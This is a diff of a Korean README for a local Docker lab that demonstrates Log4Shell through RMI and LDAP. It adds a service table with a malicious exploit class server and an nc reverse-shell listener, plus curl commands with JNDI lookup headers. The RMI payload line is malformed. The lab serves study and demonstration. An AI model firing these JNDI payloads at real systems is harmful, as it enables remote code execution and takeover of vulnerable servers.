@@ -1,7 +1,23 @@
 # Log4Shell-PoC
 Log4Shell PoC with RMI, LDAP
 
-## Vulnerable Application
+---- 
+
+# 각 서비스에 대한 설명
+
+|구분|위치|포트(TCP)|설명|
+|:--:|:--:|:--:|:--:|
+|`Vulnerable Application`|Docker 컨테이너 | 7777 | 취약한 웹 애플리케이션 서버로, Log4Shell 취약점이 발생된다.|
+|`RMI Server` | Docker 컨테이너 | 1099 | Vulnerable Appliation으로 부터 RMI 요청을 전달받아, RCE 를 발생시키기 위한 페이로드를 응답한다.|
+|`LDAP Server` | Docker 컨테이너 | 389 (openLDAP Server)8080 (phpLDAPadmin)|Vulnerable Appliation으로 부터 LDAP 요청을 전달받아, 악성 Java 객체를 다운로드 받도록 javaCodeBase 속성 값에 Exploit Server 주소 값을 전달한다.|
+|`Exploit Server` | 호스트 | 8888 | /Exploit.class 를 요청할 경우 RCE를 일으키는 악성 Java 객체를 반환한다.|
+|`nc -lv 9999` | 호스트 | 9999 | Vulnerable Application과 리버스 방식으로 셸을 연결하기 위함|
+
+---- 
+
+# PoC
+
+## 1. Vulnerable Application 셋팅 및 실행
 
 ### 빌드 및 실행
 
@@ -28,14 +44,7 @@ Log4Shell PoC with RMI, LDAP
     docker run --rm --platform=linux/amd64 --add-host=host.docker.internal:host-gateway --name log4shell-poc-app -p 7777:7777 log4shell-poc-app
     ```
 
-### 사용법
-
-```bash
-# 아래 명령어를 호스트 PC에서 실행할 경우 log4shell-poc-app 컨테이너 로그에 아래 메시지(헤더 'msg')가 출력된다.
-curl localhost:7777/log -H 'msg: Log4j Test >> ${java:version}, ${java:vm}, ${env:PATH}'
-```
-
-## RMI Server
+## 2. RMI Server 셋팅 및 실행
 
 ### 빌드 및 실행
 1.  `rmi-server` 폴더로 이동한 뒤, `Dockerfile` 을 빌드하여 도커 이미지를 생성한다.
@@ -50,7 +59,9 @@ curl localhost:7777/log -H 'msg: Log4j Test >> ${java:version}, ${java:vm}, ${en
     docker run --rm --platform=linux/amd64 --add-host=host.docker.internal:host-gateway --name log4shell-rmi-server -p 1099:1099 log4shell-rmi-server
     ```
 
-## LDAP Server
+## 3. LDAP Server 셋팅 및 실행
+
+> 악성 응답 데이터가 이미 셋팅되어 있다. 
 
 ### 빌드 및 실행
 1. `ldap-server` 폴더로 이동한 뒤, 아래의 명령어를 통해 실행한다.
@@ -61,7 +72,9 @@ curl localhost:7777/log -H 'msg: Log4j Test >> ${java:version}, ${java:vm}, ${en
 
 2. 위 명령어가 정상적으로 수행됐으면 [http://localhost:8080](http://localhost:8080)를 브라우저를 통해 접속한다.
 
-## Exploit Server
+## 4. Exploit Server 셋팅 및 실행
+
+> 참고로, 악성 Java 객체가 이미 컴파일 되어 저장소에 Commit 상태이다.
 
 ### 빌드 및 실행
 1. `exploit-server` 폴더로 이동한 뒤, 아래의 명령어를 통해 `Exploit.java` 를 컴파일한다.
@@ -75,3 +88,17 @@ curl localhost:7777/log -H 'msg: Log4j Test >> ${java:version}, ${java:vm}, ${en
     ```bash
     python3 -m http.server
     ```
+
+## 5. Exploit 수행
+
+> Exploit은 Host에서 Vulnerable Application으로 요청을 수행한다.
+
+### [Exploit] Log4Shell using RMI
+```bash
+curl localhost:7777/log -H 'msg: ${jndi://host.docker.internal:1099/Service'
+```
+
+### [Exploit] Log4Shell using LDAP
+```bash
+curl localhost:7777/log -H 'msg: ${jndi:ldap://host.docker.internal:389/cn=payload,ou=payloads,dc=example,dc=com}'
+```
